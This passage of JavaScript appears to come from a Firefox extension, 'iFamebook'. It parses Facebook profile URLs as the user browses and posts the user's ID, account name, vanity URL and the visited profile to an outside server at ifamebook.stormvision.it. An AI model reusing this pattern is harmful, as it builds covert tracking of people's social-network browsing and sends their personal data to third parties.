					IFAMEBOOK_i++;
				}
				if (IFAMEBOOK_beingVisited && IFAMEBOOK_i <= 6) IFAMEBOOK_whoIsVisited = IFAMEBOOK_beingVisited;
				
				
			}
			
			
			// Checking for URL without sharp
			
			var gotInterr2 = /https?:\/\/www.facebook.com\/\?/.test(aURI.spec); // detect if we are in the home page
			var gotPages2 = /https?:\/\/www.facebook.com\/pages/.test(aURI.spec); // detect if we are in a page
			
			if (gotSharp == false && gotInterr2 == false && gotPages2 == false && gotSkip == false) { // Probably we have a profile URL without sharp in it
				
				
				 var IFAMEBOOK_reProfile = /(?:https?:\/\/www.facebook.com\/profile)(?:\.php)(?:\?id\=)(\d+)/i; // id
				 var IFAMEBOOK_reProfile1 = /(?:https?:\/\/www.facebook.com\/profile)(?:\.php)(:?\S+)(?:\&id\=)(\d+)/i; // id from show friends
				 var IFAMEBOOK_reProfile2 = /(?:https?:\/\/www.facebook.com\/profile)(?:\.php)(?:\?v\=)(:?\S+\&id\=)(\d+)/i; // id from non friend profile
				 var IFAMEBOOK_reUsername1 = /(?:https?:\/\/www.facebook.com\/)(\w+)(?:\.)(\w+)(?:\.)(\w+)/i; // colon
				 var IFAMEBOOK_reUsername2Php = /(?:https?:\/\/www.facebook.com\/)(\w+)(?:\.)(php)/i; // dot excluding .php
				 var IFAMEBOOK_reUsername2 = /(?:https?:\/\/www.facebook.com\/)(\w+)(?:\.)(\w+)/i; // dot
				 var IFAMEBOOK_reUsername3 = /(?:https?:\/\/www.facebook.com\/)(\w+)(?:\/)/i; // slash after letters, whe are not in a profile
				 var IFAMEBOOK_reUsername4 = /(?:https?:\/\/www.facebook.com\/)(\w+)/i; // single user name
				
				 var IFAMEBOOK_gotProfile = aURI.spec.match(IFAMEBOOK_reProfile);
				 var IFAMEBOOK_gotProfile1 = aURI.spec.match(IFAMEBOOK_reProfile1);
				 var IFAMEBOOK_gotProfile2 = aURI.spec.match(IFAMEBOOK_reProfile2);
				 var IFAMEBOOK_gotUsername1 = aURI.spec.match(IFAMEBOOK_reUsername1);
				 var IFAMEBOOK_gotUsername2Php = aURI.spec.match(IFAMEBOOK_reUsername2Php);
				 var IFAMEBOOK_gotUsername2 = aURI.spec.match(IFAMEBOOK_reUsername2);
				 var IFAMEBOOK_gotUsername3 = aURI.spec.match(IFAMEBOOK_reUsername3);
				 var IFAMEBOOK_gotUsername4 = aURI.spec.match(IFAMEBOOK_reUsername4);
				var IFAMEBOOK_uVisited3Php;
				
				 var IFAMEBOOK_uVisited = (IFAMEBOOK_gotProfile) ? IFAMEBOOK_gotProfile[1] : null;
				 var IFAMEBOOK_uVisited0 = (!IFAMEBOOK_gotProfile && IFAMEBOOK_gotProfile1) ? IFAMEBOOK_gotProfile1[2] : null;  // ref from show friends
				 var IFAMEBOOK_uVisited1 = (!IFAMEBOOK_gotProfile && IFAMEBOOK_gotProfile2) ? IFAMEBOOK_gotProfile2[2] : null; 
				 var IFAMEBOOK_uVisited2 = (!IFAMEBOOK_gotProfile2 && IFAMEBOOK_gotUsername1) ? IFAMEBOOK_gotUsername1[1]+"."+IFAMEBOOK_gotUsername1[2]+"."+IFAMEBOOK_gotUsername1[3] : null;
				 IFAMEBOOK_uVisited3Php = (!IFAMEBOOK_gotUsername1 && IFAMEBOOK_gotUsername2Php) ? IFAMEBOOK_gotUsername2Php[1]+"."+IFAMEBOOK_gotUsername2Php[2] : null; // not in a profile, php pages, kept only for residual principle
				 var IFAMEBOOK_uVisited3 = (!IFAMEBOOK_gotUsername2Php && IFAMEBOOK_gotUsername2) ? IFAMEBOOK_gotUsername2[1]+"."+IFAMEBOOK_gotUsername2[2] : null;
				 var IFAMEBOOK_uVisited4 = (!IFAMEBOOK_gotUsername2 && IFAMEBOOK_gotUsername3) ? IFAMEBOOK_gotUsername3[1] : null; // not in a profile, kept only for residual principle
				 var IFAMEBOOK_uVisited5 = (!IFAMEBOOK_gotUsername3 && !IFAMEBOOK_uVisited3Php && IFAMEBOOK_gotUsername4) ? IFAMEBOOK_gotUsername4[1] : null;
				
				
				
				var IFAMEBOOK_i = 0;
				var IFAMEBOOK_visitArr = new Array(IFAMEBOOK_uVisited, IFAMEBOOK_uVisited0, IFAMEBOOK_uVisited1, IFAMEBOOK_uVisited2, IFAMEBOOK_uVisited3, IFAMEBOOK_uVisited5);
				while (IFAMEBOOK_i <= IFAMEBOOK_visitArr.length) {
					if (IFAMEBOOK_visitArr[IFAMEBOOK_i]) {IFAMEBOOK_beingVisited = IFAMEBOOK_visitArr[IFAMEBOOK_i]; break;}
					IFAMEBOOK_i++;
				}
				if (IFAMEBOOK_beingVisited && IFAMEBOOK_i <= 6) IFAMEBOOK_whoIsVisited = IFAMEBOOK_beingVisited;
				
				
				
			}
			
			
			
		}
		
		
		
		// Collecting data for the database
		
		var indice = IFAMEBOOK_valori.length;
		
		var d = new Date();
		var timeOk = true;
		var idx;
		var timeToSave = d.getTime();	  
		
	
		
		if (IFAMEBOOK_userID && IFAMEBOOK_whoIsVisited && IFAMEBOOK_vanityUrl && IFAMEBOOK_navAccountName) { 
			IFAMEBOOK_verCookie();
			
			
			// Insert data in array of array
			IFAMEBOOK_valori[indice] = new Array();
			IFAMEBOOK_valori[indice].push(IFAMEBOOK_whoIsVisited);
			IFAMEBOOK_valori[indice].push(timeToSave);	
			
			// If the value is new, verify 1h has passed from first visit
			for (idx = 0; idx <= indice; idx++) {
				if (IFAMEBOOK_valori[idx][1] != timeToSave && IFAMEBOOK_whoIsVisited == IFAMEBOOK_valori[idx][0] && timeToSave <= parseInt(IFAMEBOOK_valori[idx][1]+3600000,10)) {	
					timeOk = false;	
					break;
				}
			}
			// If 1h has passed, send data
			if (timeOk == true) {
				
				
				IFAMEBOOK_SHA1();
			
				
				// Send HTTP request and save variables
				var http_request = false;
								
				// Posting data to database
				var poststr = "userID=" + IFAMEBOOK_userID + "&whoIsVisited=" + encodeURI(IFAMEBOOK_whoIsVisited) + "&navAccountName=" + encodeURI(IFAMEBOOK_navAccountName)+ "&vanityUrl=" + encodeURI(IFAMEBOOK_vanityUrl) + "&numHash=" + IFAMEBOOK_numHash;
				
				var urlToPost = content.document.location.protocol+'//ifamebook.stormvision.it/if_post.php';	
				IFAMEBOOK_makePOSTRequest(urlToPost, poststr);
				
			}
			
			IFAMEBOOK_whoIsVisited = null; 
		}
			
		
		this.oldURL = aURI.spec;
	}
};


// Adding event listeners

window.addEventListener("load", function() {IFAMEBOOK_container.init()}, false);
window.addEventListener("unload", function() {IFAMEBOOK_container.uninit()}, false);